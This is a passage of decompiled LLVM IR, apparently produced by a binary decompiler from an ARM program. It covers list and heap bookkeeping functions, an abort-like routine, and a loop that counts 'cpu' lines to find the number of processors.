  %v0_d574 = load i32, i32* %lr.global-to-local, align 4
  %v1_d574 = add i32 %v0_d574, 8
  %v2_d574 = inttoptr i32 %v1_d574 to i32*
  %v3_d574 = load i32, i32* %v2_d574, align 4
  store i32 %v3_d574, i32* %r1.global-to-local, align 4
  %v1_d578 = add i32 %v3_d574, 12
  %v2_d578 = inttoptr i32 %v1_d578 to i32*
  %v3_d578 = load i32, i32* %v2_d578, align 4
  store i32 %v3_d578, i32* %r3.global-to-local, align 4
  %v9_d57c = icmp eq i32 %v3_d578, %v0_d574
  %v1_d580 = add i32 %v0_d574, 12
  %v2_d580 = inttoptr i32 %v1_d580 to i32*
  %v3_d580 = load i32, i32* %v2_d580, align 4
  store i32 %v3_d580, i32* %r2.global-to-local, align 4
  br i1 %v9_d57c, label %dec_label_pc_d588, label %dec_label_pc_d594

dec_label_pc_d588:                                ; preds = %dec_label_pc_d574
  %v1_d588 = add i32 %v3_d580, 8
  %v2_d588 = inttoptr i32 %v1_d588 to i32*
  %v3_d588 = load i32, i32* %v2_d588, align 4
  store i32 %v3_d588, i32* %r3.global-to-local, align 4
  %v9_d58c = icmp eq i32 %v3_d588, %v0_d574
  br i1 %v9_d58c, label %dec_label_pc_d598, label %dec_label_pc_d594

dec_label_pc_d594:                                ; preds = %dec_label_pc_d574, %dec_label_pc_d530, %dec_label_pc_d514, %dec_label_pc_d588
  %v0_d594 = call i32 @function_d6d4()
  store i32 %v0_d594, i32* %r0.global-to-local, align 4
  %v0_d598.pre = load i32, i32* @r1, align 4
  %v1_d598.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_d598

dec_label_pc_d598:                                ; preds = %dec_label_pc_d588, %dec_label_pc_d594
  %v1_d598 = phi i32 [ %v3_d580, %dec_label_pc_d588 ], [ %v1_d598.pre, %dec_label_pc_d594 ]
  %v0_d598 = phi i32 [ %v3_d574, %dec_label_pc_d588 ], [ %v0_d598.pre, %dec_label_pc_d594 ]
  %v2_d598 = add i32 %v1_d598, 8
  %v3_d598 = inttoptr i32 %v2_d598 to i32*
  store i32 %v0_d598, i32* %v3_d598, align 4
  %v0_d59c = load i32, i32* %r2.global-to-local, align 4
  %v1_d59c = load i32, i32* %r1.global-to-local, align 4
  %v2_d59c = add i32 %v1_d59c, 12
  %v3_d59c = inttoptr i32 %v2_d59c to i32*
  store i32 %v0_d59c, i32* %v3_d59c, align 4
  %v0_d5a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_d5a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_d5a0 = add i32 %v1_d5a0, %v0_d5a0
  store i32 %v2_d5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d560.dec_label_pc_d5a4_crit_edge, %dec_label_pc_d598
  %v0_d5b4 = phi i32 [ %v0_d5b4.pre, %dec_label_pc_d560.dec_label_pc_d5a4_crit_edge ], [ %v2_d5a0, %dec_label_pc_d598 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d5a8 = load i32, i32* @r7, align 4
  %v2_d5a8 = add i32 %v0_d5a8, 64
  %v3_d5a8 = inttoptr i32 %v2_d5a8 to i32*
  %v4_d5a8 = load i32, i32* %v3_d5a8, align 4
  %v1_d5ac = add i32 %v4_d5a8, 52
  store i32 %v1_d5ac, i32* %r3.global-to-local, align 4
  %v1_d5b0 = add i32 %v4_d5a8, 60
  %v2_d5b0 = inttoptr i32 %v1_d5b0 to i32*
  %v3_d5b0 = load i32, i32* %v2_d5b0, align 4
  store i32 %v3_d5b0, i32* %r1.global-to-local, align 4
  %v1_d5b4 = or i32 %v0_d5b4, 1
  store i32 %v1_d5b4, i32* %r2.global-to-local, align 4
  %v1_d5b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d5b8 = add i32 %v1_d5b8, 12
  %v3_d5b8 = inttoptr i32 %v2_d5b8 to i32*
  store i32 %v1_d5ac, i32* %v3_d5b8, align 4
  %v0_d5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_d5bc = load i32, i32* %r4.global-to-local, align 4
  %v2_d5bc = add i32 %v1_d5bc, 8
  %v3_d5bc = inttoptr i32 %v2_d5bc to i32*
  store i32 %v0_d5bc, i32* %v3_d5bc, align 4
  %v0_d5c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d5c0 = add i32 %v1_d5c0, 4
  %v3_d5c0 = inttoptr i32 %v2_d5c0 to i32*
  store i32 %v0_d5c0, i32* %v3_d5c0, align 4
  %v0_d5c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_d5c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d5c4 = add i32 %v1_d5c4, %v0_d5c4
  %v4_d5c4 = inttoptr i32 %v3_d5c4 to i32*
  store i32 %v0_d5c4, i32* %v4_d5c4, align 4
  %v0_d5c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d5c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_d5c8 = add i32 %v1_d5c8, 12
  %v3_d5c8 = inttoptr i32 %v2_d5c8 to i32*
  store i32 %v0_d5c8, i32* %v3_d5c8, align 4
  %v0_d5cc = load i32, i32* %r4.global-to-local, align 4
  %v1_d5cc = load i32, i32* %r3.global-to-local, align 4
  %v2_d5cc = add i32 %v1_d5cc, 8
  %v3_d5cc = inttoptr i32 %v2_d5cc to i32*
  store i32 %v0_d5cc, i32* %v3_d5cc, align 4
  br label %dec_label_pc_d5e4

dec_label_pc_d5d4:                                ; preds = %dec_label_pc_d548
  %v2_d5d4 = add i32 %v1_d558, %v0_d5d4
  store i32 %v2_d5d4, i32* %ip.global-to-local, align 4
  %v1_d5d8 = or i32 %v2_d5d4, 1
  store i32 %v1_d5d8, i32* %r3.global-to-local, align 4
  %v0_d5dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d5dc, i32* %v2_d550, align 4
  %v0_d5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d5e0 = add i32 %v1_d5e0, 4
  %v3_d5e0 = inttoptr i32 %v2_d5e0 to i32*
  store i32 %v0_d5e0, i32* %v3_d5e0, align 4
  br label %dec_label_pc_d5e4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5a4, %dec_label_pc_d5d4
  %v0_d5e4 = load i32, i32* %ip.global-to-local, align 4
  %v3_d5e8 = icmp ult i32 %v0_d5e4, 131070
  br i1 %v3_d5e8, label %dec_label_pc_d654, label %dec_label_pc_d5ec

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5e4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d5f0 = load i32, i32* @r7, align 4
  %v2_d5f0 = add i32 %v0_d5f0, 64
  %v3_d5f0 = inttoptr i32 %v2_d5f0 to i32*
  %v4_d5f0 = load i32, i32* %v3_d5f0, align 4
  store i32 %v4_d5f0, i32* @r4, align 4
  %v1_d5f4 = inttoptr i32 %v4_d5f0 to i32*
  %v2_d5f4 = load i32, i32* %v1_d5f4, align 4
  store i32 %v2_d5f4, i32* %r3.global-to-local, align 4
  %v1_d5f8 = and i32 %v2_d5f4, 2
  %v2_d5f8 = icmp eq i32 %v1_d5f8, 0
  br i1 %v2_d5f8, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_d5ec
  store i32 %v4_d5f0, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d5ec, %bb
  store i32 54788, i32* @lr, align 4
  %v1_d600 = xor i1 %v2_d5f8, true
  call void @__pseudo_cond_branch(i1 %v1_d600, i32 ptrtoint (i32* @global_var_d2a4.310 to i32))
  %v0_d604 = load i32, i32* @r4, align 4
  %v1_d604 = add i32 %v0_d604, 44
  %v2_d604 = inttoptr i32 %v1_d604 to i32*
  %v3_d604 = load i32, i32* %v2_d604, align 4
  store i32 %v3_d604, i32* %r3.global-to-local, align 4
  %v1_d608 = add i32 %v3_d604, 4
  %v2_d608 = inttoptr i32 %v1_d608 to i32*
  %v3_d608 = load i32, i32* %v2_d608, align 4
  store i32 %v3_d608, i32* %r3.global-to-local, align 4
  %v1_d60c = add i32 %v0_d604, 836
  %v2_d60c = inttoptr i32 %v1_d60c to i32*
  %v3_d60c = load i32, i32* %v2_d60c, align 4
  store i32 %v3_d60c, i32* %r2.global-to-local, align 4
  %v1_d610 = and i32 %v3_d608, -4
  store i32 %v1_d610, i32* %r3.global-to-local, align 4
  %v3_d614 = icmp ult i32 %v1_d610, %v3_d60c
  br i1 %v3_d614, label %dec_label_pc_d654, label %dec_label_pc_d61c

dec_label_pc_d61c:                                ; preds = %bb15
  store i32 %v0_d604, i32* %r1.global-to-local, align 4
  %v1_d620 = add i32 %v0_d604, 840
  %v2_d620 = inttoptr i32 %v1_d620 to i32*
  %v3_d620 = load i32, i32* %v2_d620, align 4
  store i32 %v3_d620, i32* %r0.global-to-local, align 4
  %v2_d624 = call i32 @function_d1f4(i32 %v3_d620, i32 %v0_d604)
  store i32 %v2_d624, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d654

dec_label_pc_d62c:                                ; preds = %dec_label_pc_d4f0
  %v2_d62c = inttoptr i32 %v1_d4c0 to i32*
  %v3_d62c = load i32, i32* %v2_d62c, align 4
  store i32 %v3_d62c, i32* %r0.global-to-local, align 4
  %v1_d630 = add i32 %v4_d4b0, 848
  %v2_d630 = inttoptr i32 %v1_d630 to i32*
  %v3_d630 = load i32, i32* %v2_d630, align 4
  store i32 %v3_d630, i32* %r2.global-to-local, align 4
  %v1_d634 = add i32 %v4_d4b0, 868
  %v2_d634 = inttoptr i32 %v1_d634 to i32*
  %v3_d634 = load i32, i32* %v2_d634, align 4
  %v2_d638 = add i32 %v3_d62c, %v1_d4bc
  store i32 %v2_d638, i32* %r1.global-to-local, align 4
  %v1_d63c = add i32 %v3_d630, -1
  store i32 %v1_d63c, i32* %r2.global-to-local, align 4
  %v2_d640 = sub i32 %v3_d634, %v2_d638
  store i32 %v2_d640, i32* %r3.global-to-local, align 4
  store i32 %v2_d640, i32* %v2_d634, align 4
  %v1_d648 = load i32, i32* @lr, align 4
  %v2_d648 = add i32 %v1_d648, 848
  %v3_d648 = inttoptr i32 %v2_d648 to i32*
  store i32 %v1_d63c, i32* %v3_d648, align 4
  %v0_d64c = load i32, i32* %r0.global-to-local, align 4
  %v1_d64c = load i32, i32* @r5, align 4
  %v2_d64c = sub i32 %v1_d64c, %v0_d64c
  store i32 %v2_d64c, i32* %r0.global-to-local, align 4
  %v4_d650 = call i32 @function_f3c4(i32 %v2_d64c, i32 %v2_d638, i32 %v1_d63c, i32 %v2_d640)
  store i32 %v4_d650, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d654

dec_label_pc_d654:                                ; preds = %bb15, %dec_label_pc_d5e4, %dec_label_pc_d61c, %dec_label_pc_d4d0, %dec_label_pc_d62c
  store i32 %v2_d464, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_d660 = load i32, i32* @r7, align 4
  %v2_d660 = add i32 %v0_d660, 44
  %v3_d660 = inttoptr i32 %v2_d660 to i32*
  %v4_d660 = load i32, i32* %v3_d660, align 4
  store i32 %v4_d660, i32* %ip.global-to-local, align 4
  store i32 54892, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d660)
  br label %dec_label_pc_d66c

dec_label_pc_d66c:                                ; preds = %dec_label_pc_d458, %dec_label_pc_d654
  store i32 %v3_d458, i32* @r4, align 4
  store i32 %v6_d458, i32* @r5, align 4
  store i32 %v9_d458, i32* @r6, align 4
  store i32 %v12_d458, i32* @r7, align 4
  store i32 %v18_d458, i32* @lr, align 4
  ret i32 %v2_d464

; uselistorder directives
  uselistorder i32 %v0_d604, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_d5c4, { 1, 0 }
  uselistorder i32 %v1_d504, { 1, 0 }
  uselistorder i32 %v0_d504, { 1, 0 }
  uselistorder i32 %v3_d4d8, { 1, 0 }
  uselistorder i32 %v1_d4bc, { 1, 0, 2 }
  uselistorder i32 %v2_d4b8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_d4b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d460, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 4, 14, 1, 2, 3, 0, 5, 6, 12, 13, 7, 8, 9, 11, 10 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_d66c, { 1, 0 }
  uselistorder label %dec_label_pc_d654, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_d5e4, { 1, 0 }
  uselistorder label %dec_label_pc_d5a4, { 1, 0 }
  uselistorder label %dec_label_pc_d598, { 1, 0 }
  uselistorder label %dec_label_pc_d594, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_d548, { 1, 0 }
}

define i32 @function_d67c(i32 %arg1) local_unnamed_addr {
dec_label_pc_d67c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_d67c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d67c, label %bb, label %dec_label_pc_d67c..thread4_crit_edge

dec_label_pc_d67c..thread4_crit_edge:             ; preds = %dec_label_pc_d67c
  %v0_d6a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_d67c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d67c..thread4_crit_edge, %bb
  %v0_d6a8 = phi i32 [ %v0_d6a8.pre, %dec_label_pc_d67c..thread4_crit_edge ], [ 0, %bb ]
  %v3_d694 = load i32, i32* @r4, align 4
  store i32 %v3_d694, i32* %stack_var_-12, align 4
  %v6_d694 = load i32, i32* @r5, align 4
  %v9_d694 = load i32, i32* @lr, align 4
  %v4_d6a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_d6a4, i32* @r5, align 4
  store i32 %v0_d6a8, i32* @r4, align 4
  store i32 %v4_d6a4, i32* @r0, align 4
  %v0_d6b4 = call i32 @function_d2a4()
  %v0_d6b8 = load i32, i32* @r4, align 4
  store i32 %v0_d6b8, i32* %r0.global-to-local, align 4
  %v0_d6bc = load i32, i32* @r5, align 4
  %v2_d6c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d6c4, i32* @r4, align 4
  store i32 %v6_d694, i32* @r5, align 4
  store i32 %v9_d694, i32* @lr, align 4
  %v2_d6c8 = call i32 @function_d1f4(i32 %v0_d6b8, i32 %v0_d6bc)
  store i32 %v2_d6c8, i32* %r0.global-to-local, align 4
  ret i32 %v2_d6c8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_d1f4, { 1, 0 }
  uselistorder i32 ()* @function_d2a4, { 3, 2, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_d6d4() local_unnamed_addr {
dec_label_pc_d6d4:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r5, align 4
  %v4_d6ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 16) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_d6ec)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_d714 = call i32 @function_f510(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_d71c = load i32, i32* @r5, align 4
  %v2_d71c = add i32 %v0_d71c, 612
  %v3_d71c = inttoptr i32 %v2_d71c to i32*
  %v4_d71c = load i32, i32* %v3_d71c, align 4
  %v2_d720 = icmp eq i32 %v4_d71c, 0
  br i1 %v2_d720, label %dec_label_pc_d728, label %dec_label_pc_d768

dec_label_pc_d728:                                ; preds = %dec_label_pc_d6d4
  store i32 1, i32* %v3_d71c, align 4
  br label %dec_label_pc_d730

dec_label_pc_d730:                                ; preds = %dec_label_pc_d778, %dec_label_pc_d728
  %v0_d734 = load i32, i32* @r5, align 4
  %v2_d734 = add i32 %v0_d734, 228
  store i32 %v2_d734, i32* @r4, align 4
  %v2_d740 = add i32 %v0_d734, 68
  %v3_d740 = inttoptr i32 %v2_d740 to i32*
  %v4_d740 = load i32, i32* %v3_d740, align 4
  call void @__pseudo_branch(i32 %v4_d740)
  %v1_d750 = call i32 @function_e4dc(i32 6)
  %v0_d75c = load i32, i32* @r5, align 4
  %v2_d75c = add i32 %v0_d75c, 16
  %v3_d75c = inttoptr i32 %v2_d75c to i32*
  %v4_d75c = load i32, i32* %v3_d75c, align 4
  call void @__pseudo_branch(i32 %v4_d75c)
  %v0_d76c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d768

dec_label_pc_d768:                                ; preds = %dec_label_pc_d6d4, %dec_label_pc_d730
  %v1_d780 = phi i32 [ %v0_d71c, %dec_label_pc_d6d4 ], [ %v0_d76c.pre, %dec_label_pc_d730 ]
  %v2_d76c = add i32 %v1_d780, 612
  %v3_d76c = inttoptr i32 %v2_d76c to i32*
  %v4_d76c = load i32, i32* %v3_d76c, align 4
  %v7_d770 = icmp eq i32 %v4_d76c, 1
  br i1 %v7_d770, label %dec_label_pc_d778, label %dec_label_pc_d7b4

dec_label_pc_d778:                                ; preds = %dec_label_pc_d768
  %v2_d778 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d778, i32* @r4, align 4
  store i32 2, i32* %v3_d76c, align 4
  %v3_d790 = bitcast i32* %stack_var_-28 to i8*
  %v4_d790 = call i32 @function_bff0(i8* %v3_d790, i32 0, i32 20)
  %v3_d7ac = call i32 @function_f0a4(i32 6, i32 %v2_d778, i32 0)
  br label %dec_label_pc_d730

dec_label_pc_d7b4:                                ; preds = %dec_label_pc_d768
  %v7_d7b4 = icmp eq i32 %v4_d76c, 2
  br i1 %v7_d7b4, label %dec_label_pc_d7bc, label %dec_label_pc_d7c8

dec_label_pc_d7bc:                                ; preds = %dec_label_pc_d7b4
  store i32 3, i32* %v3_d76c, align 4
  %v0_d7c4 = call i32 @function_d6d4()
  %v0_d7c8.pre = load i32, i32* @r5, align 4
  %v1_d7c8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_d7c8

dec_label_pc_d7c8:                                ; preds = %dec_label_pc_d7b4, %dec_label_pc_d7bc
  %v3_d7d4 = phi i32 [ 612, %dec_label_pc_d7b4 ], [ %v1_d7c8.pre, %dec_label_pc_d7bc ]
  %v2_d7d4 = phi i32 [ %v1_d780, %dec_label_pc_d7b4 ], [ %v0_d7c8.pre, %dec_label_pc_d7bc ]
  %v2_d7c8 = add i32 %v2_d7d4, %v3_d7d4
  %v3_d7c8 = inttoptr i32 %v2_d7c8 to i32*
  %v4_d7c8 = load i32, i32* %v3_d7c8, align 4
  %v7_d7cc = icmp eq i32 %v4_d7c8, 3
  br i1 %v7_d7cc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d7c8
  store i32 4, i32* %v3_d7c8, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d7c8, %bb
  call void @__pseudo_cond_branch(i1 %v7_d7cc, i32 ptrtoint (i32* @global_var_f1a0.319 to i32))
  br label %dec_label_pc_d7e0

dec_label_pc_d7e0:                                ; preds = %dec_label_pc_d7e0, %.thread1
  %v0_d7e0 = call i32 @function_d6d4()
  br label %dec_label_pc_d7e0

; uselistorder directives
  uselistorder i32* %v3_d76c, { 1, 0, 2 }
  uselistorder i32 6, { 3, 4, 13, 10, 0, 11, 1, 12, 5, 6, 2, 7, 8, 9 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_d7c8, { 1, 0 }
  uselistorder label %dec_label_pc_d768, { 1, 0 }
}

define i32 @function_d7ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_d7ec:
  %v0_d7ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7ec, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_d7ec
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d7ec, %bb
  %v4_d7f8 = phi i32 [ %arg1, %dec_label_pc_d7ec ], [ 0, %bb ]
  ret i32 %v4_d7f8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_d7fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_d7fc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r5, align 4
  %v4_d808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 140) to i32*), align 4
  store i32 %v4_d808, i32* @r4, align 4
  %v2_d810 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_d810, i32* %r0.global-to-local, align 4
  %v4_d828 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_d828)
  %v0_d838 = load i32, i32* @r4, align 4
  store i32 %v0_d838, i32* %r0.global-to-local, align 4
  %v0_d83c = load i32, i32* @r5, align 4
  %v2_d83c = add i32 %v0_d83c, 16
  %v3_d83c = inttoptr i32 %v2_d83c to i32*
  %v4_d83c = load i32, i32* %v3_d83c, align 4
  call void @__pseudo_branch(i32 %v4_d83c)
  %v0_d84c = load i32, i32* @r5, align 4
  %v2_d84c = add i32 %v0_d84c, 616
  %v3_d84c = inttoptr i32 %v2_d84c to i32*
  %v4_d84c = load i32, i32* %v3_d84c, align 4
  %v2_d854 = icmp eq i32 %v4_d84c, 0
  br i1 %v2_d854, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d7fc
  %v1_d858 = load i32, i32* @r6, align 4
  store i32 %v1_d858, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d7fc, %bb
  %v2_d860 = xor i1 %v2_d854, true
  call void @__pseudo_cond_branch(i1 %v2_d860, i32 %v4_d84c)
  store i32 %v2_d810, i32* @r0, align 4
  %v0_d870 = load i32, i32* @r5, align 4
  %v2_d870 = add i32 %v0_d870, 44
  %v3_d870 = inttoptr i32 %v2_d870 to i32*
  %v4_d870 = load i32, i32* %v3_d870, align 4
  call void @__pseudo_branch(i32 %v4_d870)
  %v0_d87c = call i32 @function_eae8()
  store i32 %v0_d87c, i32* %r0.global-to-local, align 4
  %v0_d884 = load i32, i32* @r5, align 4
  %v2_d884 = add i32 %v0_d884, -52888
  %v2_d88c = icmp eq i32 %v2_d884, 0
  br i1 %v2_d88c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_d894 = xor i1 %v2_d88c, true
  call void @__pseudo_cond_branch(i1 %v2_d894, i32 %v2_d884)
  %v0_d898 = load i32, i32* @r6, align 4
  store i32 %v0_d898, i32* %r0.global-to-local, align 4
  %v1_d89c = call i32 @function_f1a0(i32 %v0_d898)
  store i32 %v1_d89c, i32* %r0.global-to-local, align 4
  %v0_d8a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d8a0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_d8a0 = load i32, i32* @r4, align 4
  %v3_d8a0 = load i32, i32* @sl, align 4
  %v4_d8a0 = lshr i32 %v2_d8a0, %v3_d8a0
  %v5_d8a0 = sub i32 32, %v3_d8a0
  %v6_d8a0 = shl i32 %v2_d8a0, %v5_d8a0
  %v7_d8a0 = or i32 %v6_d8a0, %v4_d8a0
  %v9_d8a0 = and i32 %v7_d8a0, %v1_d89c
  call void @__pseudo_branch(i32 %v9_d8a0)
  %v0_d8a4.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d8a4.pr, label %bb11, label %..thread6_crit_edge

..thread6_crit_edge:                              ; preds = %bb10
  %v4_d8b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread6

bb11:                                             ; preds = %bb10
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %..thread6_crit_edge, %bb9, %bb11
  %v4_d8b8 = phi i32 [ %v4_d8b8.pre, %..thread6_crit_edge ], [ %v1_d89c, %bb9 ], [ 0, %bb11 ]
  ret i32 %v4_d8b8

; uselistorder directives
  uselistorder i32 %v1_d89c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 1, 6, 7, 8, 0 }
  uselistorder label %.thread6, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d8c0() local_unnamed_addr {
dec_label_pc_d8c0:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -34008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_d8e0 = call i32 @function_fb70(i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -34008))
  store i32 %v1_d8e0, i32* @r6, align 4
  %v2_d8e4 = icmp eq i32 %v1_d8e0, 0
  br i1 %v2_d8e4, label %dec_label_pc_d964, label %dec_label_pc_d8ec

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8c0
  store i32 292, i32* @sl, align 4
  %v0_d8f4 = load i32, i32* @r4, align 4
  %v2_d8f4 = add i32 %v0_d8f4, -37964
  store i32 %v2_d8f4, i32* @r8, align 4
  %v2_d8f8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_d8f8, i32* @r7, align 4
  br label %bb18

dec_label_pc_d900:                                ; preds = %bb18
  %v3_d900 = load i32, i32* %stack_var_-36, align 4
  %v1_d904 = inttoptr i32 %v3_d900 to i32*
  %v2_d904 = load i32, i32* %v1_d904, align 4
  %v1_d908 = inttoptr i32 %v2_d904 to i8*
  %v2_d908 = load i8, i8* %v1_d908, align 1
  %v7_d90c = icmp eq i8 %v2_d908, 99
  br i1 %v7_d90c, label %dec_label_pc_d914, label %.backedge3

dec_label_pc_d914:                                ; preds = %dec_label_pc_d900
  %v1_d914 = add i32 %v2_d904, 1
  %v2_d914 = inttoptr i32 %v1_d914 to i8*
  %v3_d914 = load i8, i8* %v2_d914, align 1
  %v7_d918 = icmp eq i8 %v3_d914, 112
  br i1 %v7_d918, label %dec_label_pc_d920, label %.backedge3

dec_label_pc_d920:                                ; preds = %dec_label_pc_d914
  %v1_d920 = add i32 %v2_d904, 2
  %v2_d920 = inttoptr i32 %v1_d920 to i8*
  %v3_d920 = load i8, i8* %v2_d920, align 1
  %v7_d924 = icmp eq i8 %v3_d920, 117
  br i1 %v7_d924, label %dec_label_pc_d92c, label %.backedge3

dec_label_pc_d92c:                                ; preds = %dec_label_pc_d920
  %v1_d92c = add i32 %v2_d904, 3
  %v2_d92c = inttoptr i32 %v1_d92c to i8*
  %v3_d92c = load i8, i8* %v2_d92c, align 1
  %v4_d92c = zext i8 %v3_d92c to i32
  %v0_d930 = load i32, i32* @r4, align 4
  %v1_d930 = load i32, i32* @sl, align 4
  %v2_d930 = add i32 %v1_d930, %v0_d930
  %v3_d930 = inttoptr i32 %v2_d930 to i32*
  %v4_d930 = load i32, i32* %v3_d930, align 4
  %v2_d934 = mul nuw nsw i32 %v4_d92c, 2
  %v2_d938 = add i32 %v4_d930, %v2_d934
  %v3_d938 = inttoptr i32 %v2_d938 to i16*
  %v4_d938 = load i16, i16* %v3_d938, align 2
  %v1_d93c = and i16 %v4_d938, 8
  %v2_d93c = icmp eq i16 %v1_d93c, 0
  br i1 %v2_d93c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_d92c
  %v1_d940 = load i32, i32* @r5, align 4
  %v2_d940 = add i32 %v1_d940, 1
  store i32 %v2_d940, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_d92c, %dec_label_pc_d900, %dec_label_pc_d914, %dec_label_pc_d920
  %v0_d944.pre = load i32, i32* @r6, align 4
  %v0_d950.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_d8ec
  %v0_d950 = phi i32 [ %v0_d950.pre, %.backedge3 ], [ %v2_d8f4, %dec_label_pc_d8ec ]
  %v0_d944 = phi i32 [ %v0_d944.pre, %.backedge3 ], [ %v1_d8e0, %dec_label_pc_d8ec ]
  %v4_d954 = inttoptr i32 %v0_d944 to i32*
  %v5_d954 = call i32 @function_f814(i32* %v4_d954, i32 %v2_d8f8, i32 258, i32 %v0_d950)
  %v2_d958 = icmp eq i32 %v5_d954, 0
  br i1 %v2_d958, label %dec_label_pc_d9c8, label %dec_label_pc_d900

